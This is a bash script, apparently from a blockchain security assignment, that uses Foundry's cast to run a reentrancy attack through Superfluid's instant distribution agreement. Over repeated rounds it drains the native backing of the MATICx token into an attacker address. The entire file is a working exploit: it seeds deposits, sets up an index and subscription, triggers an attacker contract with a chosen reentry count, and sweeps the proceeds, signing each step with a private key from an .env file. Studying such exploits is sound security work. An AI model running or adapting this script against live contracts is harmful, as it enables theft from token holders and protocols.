#!/bin/bash
set -e
source /Users/dldustn/Desktop/AssignmentC/.env
RPC="$RPC_CH6_SUPERFLUID_V21"
ATK="$PUBLIC_ADDRESS"
PK="$PRIVATE_KEY"

MATICX="0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
HOST="0x3E14dC1b13c488a8d5D310918780c983bD5982E7"
IDA="0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1"
FH="0x135ba7f14db39f76e53f463f753472f4a029a6e7"
RCV="0x2ebb06c0683f62873b76714ff51bbd2bc245fa1c"

REENTRY=100

for ROUND in $(seq 0 11); do
    BACKING=$(cast balance $MATICX --rpc-url "$RPC")
    echo "Round $ROUND - MATICx backing: $BACKING"

    if [ "$BACKING" = "0" ]; then
        echo "MATICx fully drained!"
        break
    fi

    BAL=$(cast balance $ATK --rpc-url "$RPC")
    echo "  Our balance: $BAL"

    # Calculate seed
    # Leave 0.5 MATIC for gas
    AVAIL=$(python3 -c "print(max(0, $BAL - 500000000000000000))")
    SEED=$(python3 -c "
backing = $BACKING
reentry = $REENTRY
seed = backing // reentry
if seed == 0:
    seed = 1
    reentry = backing
avail = $AVAIL
if seed > avail:
    seed = avail
# int256 safety
max_seed = (2**255 - 1) // (reentry + 1)
if seed > max_seed:
    seed = max_seed
print(seed)
")

    ACTUAL_REENTRY=$(python3 -c "
backing = $BACKING
reentry = $REENTRY
seed = backing // reentry
if seed == 0:
    reentry = backing
print(reentry)
")

    echo "  Seed: $SEED, Reentry: $ACTUAL_REENTRY"

    if [ "$SEED" = "0" ]; then
        echo "  Seed is 0, done"
        break
    fi

    IDX=$((700000000 + ROUND * 10))

    # 1. Upgrade MATIC to MATICx
    echo "  Upgrading..."
    cast send --private-key $PK --rpc-url "$RPC" $MATICX "upgradeByETH()" --value $SEED > /dev/null 2>&1

    # 2. Create index
    echo "  Creating index..."
    cast send --private-key $PK --rpc-url "$RPC" $HOST "callAgreement(address,bytes,bytes)" $IDA $(cast calldata "createIndex(address,uint32,bytes)" $MATICX $IDX "0x") "0x" > /dev/null 2>&1

    # 3. Update subscription
    echo "  Subscribing..."
    cast send --private-key $PK --rpc-url "$RPC" $HOST "callAgreement(address,bytes,bytes)" $IDA $(cast calldata "updateSubscription(address,uint32,address,uint128,bytes)" $MATICX $IDX $RCV 1 "0x") "0x" > /dev/null 2>&1

    # 4. Update index value
    echo "  Updating index..."
    cast send --private-key $PK --rpc-url "$RPC" $HOST "callAgreement(address,bytes,bytes)" $IDA $(cast calldata "updateIndex(address,uint32,uint128,bytes)" $MATICX $IDX $SEED "0x") "0x" > /dev/null 2>&1

    # 5. Set FH target and attack
    echo "  Attacking..."
    cast send --private-key $PK --rpc-url "$RPC" $FH "set(address,uint32,address,uint256)" $ATK $IDX $RCV $ACTUAL_REENTRY > /dev/null 2>&1
    cast send --private-key $PK --rpc-url "$RPC" --gas-limit 29000000 $FH "go()" > /dev/null 2>&1

    # 6. Drain receiver
    echo "  Draining receiver..."
    cast send --private-key $PK --rpc-url "$RPC" $RCV "drain(address,address)" $MATICX $ATK > /dev/null 2>&1

    echo "  Done round $ROUND"
done

echo "=== Final state ==="
echo "MATICx backing: $(cast balance $MATICX --rpc-url "$RPC")"
echo "Our balance: $(cast balance $ATK --rpc-url "$RPC")"
